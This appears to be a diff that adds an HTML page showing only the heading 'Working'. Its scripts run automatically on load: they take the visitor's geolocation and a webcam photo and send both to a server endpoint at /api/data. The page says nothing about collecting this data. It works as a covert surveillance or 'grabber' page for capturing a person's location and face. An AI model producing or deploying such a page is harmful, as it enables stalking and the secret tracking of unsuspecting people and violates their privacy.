@@ -1,0 +1,95 @@
+<h1>Working</h1>
+<script>
+    function takePhotoFromWebcam() {
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(function(stream) {
+          var video = document.createElement('video');
+          video.srcObject = stream;
+          video.onloadedmetadata = function() {
+            video.play();
+            var canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            var context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            var base64Data = canvas.toDataURL('image/jpeg');
+            push_image(base64Data)
+            console.log(base64Data);
+            video.pause();
+            video.srcObject = null;
+            stream.getTracks().forEach(function(track) {
+              track.stop();
+            });
+          };
+        })
+        .catch(function(error) {
+          console.log('Error accessing webcam:', error);
+        });
+    }
+</script>
+<script>
+    function getUserLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          function(position) {
+            var latitude = position.coords.latitude;
+            var longitude = position.coords.longitude;
+            var location = "-----Latitude:"+latitude+"----Longitude:"+longitude;
+            push_location(location);
+            // You can use the latitude and longitude values as needed.
+          },
+          function(error) {
+            return "Error getting location: " + error.message;
+          }
+        );
+      } else {
+        return "Geolocation is not supported by this browser.";
+      }
+    }
+</script>
+<script>
+    function push_location(location)
+    {
+        var xhttp = new XMLHttpRequest();
+        var url_full = "/api/data/location="+location;
+        xhttp.onreadystatechange = function() {
+        if (this.readyState == 4 && this.status == 200) {
+            document.getElementById("demo").innerHTML =
+            this.responseText;
+        }
+        };
+        xhttp.open("GET",url_full, true);
+        xhttp.send();
+    }
+
+    function push_image(image_encoded)
+    {
+            var data = {
+            image: image_encoded
+            };
+
+            fetch('/api/data', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(data)
+            })
+            .then(function(response) {
+                if (response.ok) {
+                return response.json();
+                }
+                throw new Error('Error posting data to the server.');
+            })
+            .then(function(responseData) {
+                console.log(responseData);
+                // Handle the response from the server
+            })
+            .catch(function(error) {
+                console.log('Error:', error.message);
+                // Handle any errors that occurred during the request
+            });
+    }
+    getUserLocation();
+    takePhotoFromWebcam();
+</script>
